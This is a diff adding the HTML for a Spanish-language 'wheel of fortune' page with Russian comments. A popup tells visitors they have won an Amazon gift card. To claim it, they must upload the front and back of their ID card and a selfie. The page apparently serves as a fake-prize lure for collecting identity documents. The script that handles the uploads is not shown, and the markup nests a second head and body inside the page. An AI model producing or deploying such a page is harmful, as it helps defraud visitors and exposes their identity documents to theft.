@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Rueda de la Fortuna</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <h1>¡Rueda de la Fortuna!</h1>
+        <div class="wheel-container">
+            <canvas id="wheel" width="350" height="350"></canvas>
+            <div class="arrow"></div>
+            <button id="spin-button" class="spin-center-button">¡GIRAR!</button>
+        </div>
+
+    <!-- Всплывающее окно -->
+    <div id="popup" class="popup hidden">
+        <h2>¡Felicidades! Tu premio es <span id="prize-name">Amazon Gift Card</span></h2>
+        <p>Para reclamar un premio debes ser mayor de 18 años, subir tus documentos y una selfie.</p>
+        <div class="upload-section">
+            <div class="upload-item">
+                <img id="preview-front" class="preview hidden" alt="Preview Front ID">
+                <p>Antes ID CARD</p>
+            </div>
+            <div class="upload-item">
+                <img id="preview-back" class="preview hidden" alt="Preview Back ID">
+                <p>Atrás ID CARD</p>
+            </div>
+            <div class="upload-item">
+                <img id="preview-selfie" class="preview hidden" alt="Preview Selfie">
+                <p>Autofoto</p>
+            </div>
+        </div>
+        <button id="upload-button">Subir Foto</button>
+        <input type="file" id="file-input" accept="image/*" class="hidden">
+        <button id="submit-button" disabled>Enviar para revisión</button>
+    </div>
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Rueda de la Fortuna</title>
+        <link rel="stylesheet" href="style.css">
+        <!-- Подключение JSZip -->
+        <script src="https://cdn.jsdelivr.net/npm/jszip@3.10.1/dist/jszip.min.js"></script>
+    </head>
+    <body>
+        <div class="container">
+            <!-- Ваш существующий HTML -->
+        </div>
+        
+    <script src="script.js"></script>
+</body>
+</html>
